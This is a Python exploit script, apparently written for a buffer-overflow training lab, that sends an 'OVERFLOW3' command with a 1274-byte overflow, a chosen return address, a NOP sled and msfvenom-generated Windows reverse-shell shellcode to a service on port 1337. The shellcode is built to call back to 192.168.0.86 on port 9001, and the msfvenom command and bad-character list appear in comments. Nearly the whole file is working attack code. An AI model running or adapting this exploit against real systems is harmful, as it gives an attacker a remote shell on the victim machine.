#!/usr/bin/env python3
import socket

ip = "192.168.0.87"
port = 1337

badchars = "".join([chr(int(hex(x),16)) for x in range(1,256)])
prefix = "OVERFLOW3 "
offset = 1274
overflow = "A" * offset
retn = "\x05\x12\x50\x62" # \x03\x12\x50\x62 \xaf\x11\x50\x62
padding = "\x90" * 8

# Badchars: \x00\x11\x40\x5f\xb8\xee
# Payload: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.86 LPORT=9001 EXITFUNC=thread -b "\x00\x11\x40\x5f\xb8\xee" -f c
payload = (
"\xfc\xbb\x23\x2f\x2a\x80\xeb\x0c\x5e\x56\x31\x1e\xad\x01"                                                                                                           
"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xdf\xc7\xa8"                                                                                                           
"\x80\x1f\x18\xcd\x09\xfa\x29\xcd\x6e\x8f\x1a\xfd\xe5\xdd"                                                                                                           
"\x96\x76\xab\xf5\x2d\xfa\x64\xfa\x86\xb1\x52\x35\x16\xe9"                                                                                                           
"\xa7\x54\x94\xf0\xfb\xb6\xa5\x3a\x0e\xb7\xe2\x27\xe3\xe5"                                                                                                           
"\xbb\x2c\x56\x19\xcf\x79\x6b\x92\x83\x6c\xeb\x47\x53\x8e"                                                                                                           
"\xda\xd6\xef\xc9\xfc\xd9\x3c\x62\xb5\xc1\x21\x4f\x0f\x7a"                                                                                                           
"\x91\x3b\x8e\xaa\xeb\xc4\x3d\x93\xc3\x36\x3f\xd4\xe4\xa8"                                                                                                           
"\x4a\x2c\x17\x54\x4d\xeb\x65\x82\xd8\xef\xce\x41\x7a\xcb"                                                                                                           
"\xef\x86\x1d\x98\xfc\x63\x69\xc6\xe0\x72\xbe\x7d\x1c\xfe"                                                                                                           
"\x41\x51\x94\x44\x66\x75\xfc\x1f\x07\x2c\x58\xf1\x38\x2e"                                                                                                           
"\x03\xae\x9c\x25\xae\xbb\xac\x64\xa7\x08\x9d\x96\x37\x07"                                                                                                           
"\x96\xe5\x05\x88\x0c\x61\x26\x41\x8b\x76\x49\x78\x6b\xe8"
"\xb4\x83\x8c\x21\x73\xd7\xdc\x59\x52\x58\xb7\x99\x5b\x8d"
"\x18\xc9\xf3\x7e\xd9\xb9\xb3\x2e\xb1\xd3\x3b\x10\xa1\xdc"
"\x91\x39\x48\x27\x72\x86\x25\x27\xd4\x6e\x34\x27\xfb\x47"
"\xb1\xc1\x91\x87\x97\x5a\x0e\x31\xb2\x10\xaf\xbe\x68\x5d"
"\xef\x35\x9f\xa2\xbe\xbd\xea\xb0\x57\x4e\xa1\xea\xfe\x51"
"\x1f\x82\x9d\xc0\xc4\x52\xeb\xf8\x52\x05\xbc\xcf\xaa\xc3"
"\x50\x69\x05\xf1\xa8\xef\x6e\xb1\x76\xcc\x71\x38\xfa\x68"
"\x56\x2a\xc2\x71\xd2\x1e\x9a\x27\x8c\xc8\x5c\x9e\x7e\xa2"
"\x36\x4d\x29\x22\xce\xbd\xea\x34\xcf\xeb\x9c\xd8\x7e\x42"
"\xd9\xe7\x4f\x02\xed\x90\xad\xb2\x12\x4b\x76\xd2\xf0\x59"
"\x83\x7b\xad\x08\x2e\xe6\x4e\xe7\x6d\x1f\xcd\x0d\x0e\xe4"
"\xcd\x64\x0b\xa0\x49\x95\x61\xb9\x3f\x99\xd6\xba\x15\x99"
"\xd8\x44\x96"
)

postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")